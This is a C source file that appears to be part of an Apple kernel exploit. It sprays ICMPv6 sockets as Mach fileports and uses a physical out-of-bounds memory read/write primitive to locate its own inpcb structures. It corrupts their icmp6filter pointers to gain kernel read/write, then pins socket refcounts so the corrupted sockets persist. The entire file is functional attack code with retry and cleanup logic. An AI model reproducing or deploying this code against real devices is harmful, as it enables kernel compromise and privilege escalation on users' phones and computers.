#include "socket.h"

#include <errno.h>
#include <netinet/icmp6.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <sys/fileport.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "krw.h"
#include "phys_oob.h"
#include "utils.h"

static bool is_kernel_heap_pointer(uint64_t value) {
    uint64_t band = value >> 32;
    return band >= 0xffffffc0ULL && band <= 0xffffffefULL && (value & 0xf) == 0;
}

static unsigned page_diff(const uint8_t* current, const uint8_t* original) {
    unsigned differences = 0;
    for (size_t offset = 0; offset + sizeof(uint64_t) <= g_ctx.oob_size; offset += sizeof(uint64_t)) {
        if (*(const uint64_t*)(current + offset) != *(const uint64_t*)(original + offset)) differences++;
    }
    return differences;
}

static bool restore_candidate(mach_port_t memory_object, mach_vm_offset_t seeking_offset, const uint8_t* original, uint8_t* scratch, size_t control_offset, size_t rw_offset) {
    size_t filter_offset = g_ctx.offsets.inpcb_icmp6filt;
    for (unsigned attempt = 0; attempt < 3; attempt++) {
        if (physical_oob_write_mo(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, (uint8_t*)original) != KERN_SUCCESS) continue;
        if (physical_oob_read_mo_with_retry(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, scratch) == KERN_SUCCESS && page_diff(scratch, original) <= 8 &&
            memcmp(scratch + control_offset + filter_offset, original + control_offset + filter_offset, EARLY_KRW_LENGTH) == 0 &&
            memcmp(scratch + rw_offset + filter_offset, original + rw_offset + filter_offset, EARLY_KRW_LENGTH) == 0) {
            return true;
        }
    }
    LOG_ERR("could not restore abandoned PCB candidate");
    g_ctx.race_failed = true;
    g_ctx.transport_unsafe = true;
    return false;
}

bool krw_sockets_leak_forever(void) {
    /*
     struct inpcb {
         decl_lck_mtx_data(, inpcb_mtx);
         LIST_ENTRY(inpcb) inp_hash;
         LIST_ENTRY(inpcb) inp_list;
         void   *inp_ppcb;
         struct inpcbinfo *inp_pcbinfo;
         struct socket *inp_socket;
     */

    // get socket from inpcb->inp_socket
    uint64_t control_socket_addr = 0;
    uint64_t rw_socket_addr = 0;
    if (!early_kread64_checked(g_ctx.control_socket_pcb + g_ctx.offsets.inpcb_inp_socket, &control_socket_addr) ||
        !early_kread64_checked(g_ctx.rw_socket_pcb + g_ctx.offsets.inpcb_inp_socket, &rw_socket_addr) || !krw_is_kernel_address(control_socket_addr) || !krw_is_kernel_address(rw_socket_addr)) {
        LOG_ERR("couldn't resolve KRW socket objects");
        return false;
    }

    offsets_t offsets = g_ctx.offsets;

    uint64_t control_socket_so_count = 0;
    uint64_t rw_socket_so_count = 0;
    if (!early_kread64_checked(control_socket_addr + offsets.socket_so_count, &control_socket_so_count) || !early_kread64_checked(rw_socket_addr + offsets.socket_so_count, &rw_socket_so_count) ||
        control_socket_so_count == 0 || rw_socket_so_count == 0) {
        LOG_ERR("couldn't read KRW socket usecounts");
        return false;
    }

    // increase ref count
    // so_usecount and so_retaincnt
    if (!early_kwrite64_checked(control_socket_addr + offsets.socket_so_count, control_socket_so_count + 0x0000100100001001) ||
        !early_kwrite64_checked(rw_socket_addr + offsets.socket_so_count, rw_socket_so_count + 0x0000100100001001)) {
        LOG_ERR("couldn't pin KRW sockets");
        return false;
    }

    uint64_t control_pinned_count = 0;
    uint64_t rw_pinned_count = 0;
    if (!early_kread64_checked(control_socket_addr + offsets.socket_so_count, &control_pinned_count) || !early_kread64_checked(rw_socket_addr + offsets.socket_so_count, &rw_pinned_count) ||
        control_pinned_count == control_socket_so_count || rw_pinned_count == rw_socket_so_count) {
        LOG_ERR("couldn't verify pinned KRW sockets");
        return false;
    }
    return true;
}

uint64_t spray_socket(void) {
    if (g_ctx.socket_ports_count >= MAX_SOCKETS_COUNT) return UINT64_MAX;

    // NOTE:
    // this will set so->so_background_thread to current thread
    // allowing us to later retrieve our task/proc/...
    // this is not part of the original exploit, but is useful to traverse to other objects
    pthread_set_qos_class_self_np(QOS_CLASS_BACKGROUND, 0);
    // create socket icmpv6
    int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0);
    if (fd < 0) {
        LOG_ERR("socket create failed");
        return UINT64_MAX;
    }

    // turn socket into mach fileport
    mach_port_t output_socket_port = MACH_PORT_NULL;
    int port_result = fileport_makeport(fd, &output_socket_port);
    close(fd);
    if (port_result != 0 || output_socket_port == MACH_PORT_NULL) return UINT64_MAX;

    uint8_t socket_info[0x400] = {};
    // this is to get inp_gencnt from inpcb to know which socket inpcb belongs to
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
    int info_size = (int)syscall(SYS_proc_info, PROC_INFO_CALL_PIDFILEPORTINFO, getpid(), PROC_PIDFILEPORTSOCKETINFO, output_socket_port, socket_info, sizeof(socket_info));
#pragma clang diagnostic pop
    if (info_size < (int)(0x110 + sizeof(uint64_t))) {
        mach_port_deallocate(mach_task_self(), output_socket_port);
        return UINT64_MAX;
    }

    uint64_t inp_gencnt = 0;
    // may need to check this offset for various versions
    memcpy(&inp_gencnt, socket_info + 0x110, sizeof(inp_gencnt));

    size_t idx = g_ctx.socket_ports_count++;

    // save output mach port from fileport_makeport
    g_ctx.socket_ports[idx] = output_socket_port;

    // save gencnt for this socket on this array
    g_ctx.socket_pcb_ids[idx] = inp_gencnt;

    return output_socket_port;
}

void sockets_release(void) {
    for (size_t i = 0; i < g_ctx.socket_ports_count; i++) {
        mach_port_deallocate(mach_task_self(), g_ctx.socket_ports[i]);
    }
    g_ctx.socket_ports_count = 0;
}

kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_t seeking_offset, uint8_t* read_buffer, uint8_t* write_buffer, uint64_t target_inp_gencnt_list[MAX_SOCKETS_COUNT],
                                      size_t* target_inp_gencnt_count, bool do_read) {
    if (g_ctx.socket_ports_count < 2) return KERN_FAILURE;
    if (do_read) {
        kern_return_t kr = physical_oob_read_mo_with_retry(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, read_buffer);
        if (kr != KERN_SUCCESS) return kr;
    }

    uint64_t search_start_idx = 0;
    bool target_found = false;
    uint64_t pcb_start_offset = 0;
    offsets_t offsets = g_ctx.offsets;
    // this is not "corrupted", it's
    // just filter set to 0, and inp6_cksum and inp6_hops initialized to -1
    uint64_t corrupted_filter_marker = 0x0000ffffffffffff;
    void* found = NULL;

    do {
        // NOTE:
        // original exploit didn't use reverse_memmem, it would round down to the nearest 0x400 boundary and
        // assume inpcb base was that, that's not true for < 17?
        found = memmem(read_buffer + search_start_idx, g_ctx.oob_size - search_start_idx, g_ctx.executable_name, strlen(g_ctx.executable_name));
        if (found != NULL) {
            uint64_t found_offset = (uint8_t*)found - read_buffer;
            void* filter_found = reverse_memmem(found, found_offset, &corrupted_filter_marker, sizeof(corrupted_filter_marker));
            if (filter_found != NULL) {
                uint64_t filter_offset = (uint8_t*)filter_found - read_buffer;
                if (filter_offset >= offsets.inpcb_icmp6filt + 0x8) {
                    pcb_start_offset = filter_offset - (offsets.inpcb_icmp6filt + 0x8);
                    target_found = true;
                    break;
                }
            }
        }
        search_start_idx += 0x400;
    } while (found != NULL && search_start_idx < g_ctx.oob_size);

    if (!target_found) {
        return KERN_FAILURE;
    }

    LOG("pcb_start_offset: %#llx", pcb_start_offset);
    uint64_t target_inp_gencnt = 0;
    memcpy(&target_inp_gencnt, read_buffer + pcb_start_offset + 0x78, sizeof(target_inp_gencnt));
    LOG("target_inp_gencnt: %#llx", target_inp_gencnt);

    // this would be the list head, le_prev points to inpcbhead struct not inpcb!
    if (target_inp_gencnt == g_ctx.socket_pcb_ids[g_ctx.socket_ports_count - 1]) {
        LOG("found last PCB");
        return KERN_FAILURE;
    }

    bool is_our_pcb = false;
    size_t control_socket_idx = 0;
    // find our controlled socket by comparing pcb gencnt
    for (size_t sock_idx = 0; sock_idx < g_ctx.socket_ports_count; sock_idx++) {
        if (g_ctx.socket_pcb_ids[sock_idx] == target_inp_gencnt) {
            is_our_pcb = true;
            control_socket_idx = sock_idx;
            break;
        }
    }
    // the pcb we found isn't ours
    if (!is_our_pcb) {
        LOG("found freed PCB page");
        return KERN_FAILURE;
    }

    if (control_socket_idx + 1 >= g_ctx.socket_ports_count) return KERN_FAILURE;

    // we already found this one
    for (size_t i = 0; i < *target_inp_gencnt_count; i++) {
        if (target_inp_gencnt_list[i] == target_inp_gencnt) {
            LOG("found old PCB page");
            return KERN_FAILURE;
        }
    }

    // save this gencnt so we don't try to corrupt it again, and we don't try to corrupt the same socket twice
    if (*target_inp_gencnt_count >= MAX_SOCKETS_COUNT) return KERN_FAILURE;
    size_t gencnt_idx = (*target_inp_gencnt_count)++;
    target_inp_gencnt_list[gencnt_idx] = target_inp_gencnt;

    /*
    struct inpcb {
     decl_lck_mtx_data(, inpcb_mtx);
     LIST_ENTRY(inpcb) inp_hash;
     LIST_ENTRY(inpcb) inp_list;
        |
        |
        v
    struct {
        struct type *le_next;  // next element
        struct type *le_prev;  // address of previous next element
    } */

    uint64_t inp_list_next_pointer = *(uint64_t*)(read_buffer + pcb_start_offset + 0x28) - offsets.inpcb_inp_list_le_next;
    uint64_t list_next = *(uint64_t*)(read_buffer + pcb_start_offset + 0x20);
    uint64_t list_prev = *(uint64_t*)(read_buffer + pcb_start_offset + 0x28);
    if (!((list_next == 0 || krw_is_kernel_address(list_next)) && krw_is_kernel_address(list_prev) && is_kernel_heap_pointer(inp_list_next_pointer))) {
        LOG("rejecting invalid inpcb linkage");
        return KERN_FAILURE;
    }

    unsigned signed_slots = 0;
    size_t rw_slot_offset = SIZE_MAX;
    uint64_t rw_gencnt = g_ctx.socket_pcb_ids[control_socket_idx + 1];
    for (size_t offset = 0; offset + offsets.inpcb_icmp6filt + 16 <= g_ctx.oob_size && offset + 0x80 <= g_ctx.oob_size; offset += 0x400) {
        if (*(uint64_t*)(read_buffer + offset + offsets.inpcb_icmp6filt + 8) != corrupted_filter_marker) {
            continue;
        }
        uint64_t gencnt = *(uint64_t*)(read_buffer + offset + 0x78);
        for (size_t socket_idx = 0; socket_idx < g_ctx.socket_ports_count; socket_idx++) {
            if (g_ctx.socket_pcb_ids[socket_idx] == gencnt) {
                signed_slots++;
                break;
            }
        }
        if (gencnt == rw_gencnt) rw_slot_offset = offset;
    }
    if (signed_slots < 2 || rw_slot_offset == SIZE_MAX) {
        LOG("rejecting uncorroborated socket pair");
        return KERN_FAILURE;
    }

    uint64_t control_socket_pcb = *(uint64_t*)(read_buffer + rw_slot_offset + offsets.inpcb_inp_list_le_next);
    uint64_t expected_control_socket_pcb = inp_list_next_pointer - rw_slot_offset + pcb_start_offset;
    if (!is_kernel_heap_pointer(control_socket_pcb) || control_socket_pcb != expected_control_socket_pcb) {
        LOG("rejecting inconsistent socket pair linkage");
        return KERN_FAILURE;
    }

    uint8_t rw_snapshot[EARLY_KRW_LENGTH];
    uint8_t original_page[0xf00];
    uint64_t control_filter = *(uint64_t*)(read_buffer + pcb_start_offset + offsets.inpcb_icmp6filt);
    memcpy(rw_snapshot, read_buffer + rw_slot_offset + offsets.inpcb_icmp6filt, sizeof(rw_snapshot));
    if (!krw_is_kernel_address(control_filter) || !krw_is_kernel_address(*(uint64_t*)rw_snapshot)) {
        LOG("rejecting invalid filter snapshots");
        return KERN_FAILURE;
    }
    memcpy(original_page, read_buffer, g_ctx.oob_size);

    memcpy(write_buffer, read_buffer, g_ctx.oob_size);
    *(uint64_t*)((uint8_t*)write_buffer + pcb_start_offset + offsets.inpcb_icmp6filt) = inp_list_next_pointer + offsets.inpcb_icmp6filt;
    *(uint64_t*)((uint8_t*)write_buffer + pcb_start_offset + offsets.inpcb_icmp6filt + 8) = 0;

    LOG("corrupting icmp6filter pointer...");
    bool corrupted = false;
    for (unsigned attempt = 0; attempt < 8; attempt++) {
        if (physical_oob_write_mo(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, write_buffer) != KERN_SUCCESS) {
            break;
        }
        if (physical_oob_read_mo_with_retry(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, read_buffer) != KERN_SUCCESS) {
            continue;
        }
        uint64_t new_icmp6filter = 0;
        memcpy(&new_icmp6filter, read_buffer + pcb_start_offset + offsets.inpcb_icmp6filt, sizeof(new_icmp6filter));
        if (new_icmp6filter == inp_list_next_pointer + offsets.inpcb_icmp6filt) {
            unsigned differences = 0;
            for (size_t offset = 0; offset + sizeof(uint64_t) <= g_ctx.oob_size; offset += sizeof(uint64_t)) {
                if (offset == pcb_start_offset + offsets.inpcb_icmp6filt || offset == pcb_start_offset + offsets.inpcb_icmp6filt + 8) continue;
                if (*(uint64_t*)(read_buffer + offset) != *(uint64_t*)(original_page + offset)) differences++;
            }
            if (differences > 4) {
                LOG_ERR("physical write changed %u unrelated qwords", differences);
                restore_candidate(memory_object, seeking_offset, original_page, read_buffer, pcb_start_offset, rw_slot_offset);
                return KERN_FAILURE;
            }
            LOG("target corrupted: %#llx", new_icmp6filter);
            corrupted = true;
            break;
        }
    }
    if (!corrupted) {
        restore_candidate(memory_object, seeking_offset, original_page, read_buffer, pcb_start_offset, rw_slot_offset);
        return KERN_FAILURE;
    }

    int sock = fileport_makefd(g_ctx.socket_ports[control_socket_idx]);
    if (sock < 0) {
        restore_candidate(memory_object, seeking_offset, original_page, read_buffer, pcb_start_offset, rw_slot_offset);
        return KERN_FAILURE;
    }

    socklen_t getsockopt_read_length = EARLY_KRW_LENGTH;
    uint8_t readback[EARLY_KRW_LENGTH] = {};
    int res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, readback, &getsockopt_read_length);
    if (res != 0 || getsockopt_read_length < EARLY_KRW_LENGTH || memcmp(readback, rw_snapshot, EARLY_KRW_LENGTH) != 0) {
        LOG_ERR("control filter readback mismatch");
        if (restore_candidate(memory_object, seeking_offset, original_page, read_buffer, pcb_start_offset, rw_slot_offset)) close(sock);
        return KERN_FAILURE;
    }

    int rw_sock = fileport_makefd(g_ctx.socket_ports[control_socket_idx + 1]);
    if (rw_sock < 0) {
        if (restore_candidate(memory_object, seeking_offset, original_page, read_buffer, pcb_start_offset, rw_slot_offset)) close(sock);
        return KERN_FAILURE;
    }

    LOG("found control_socket at idx: %#zx", control_socket_idx);
    g_ctx.control_socket = sock;
    g_ctx.rw_socket = rw_sock;
    g_ctx.control_socket_pcb = control_socket_pcb;
    g_ctx.rw_socket_pcb = inp_list_next_pointer;
    memcpy(g_ctx.rw_filter_snapshot, rw_snapshot, sizeof(rw_snapshot));
    g_ctx.filter_snapshots_valid = true;
    return KERN_SUCCESS;
}
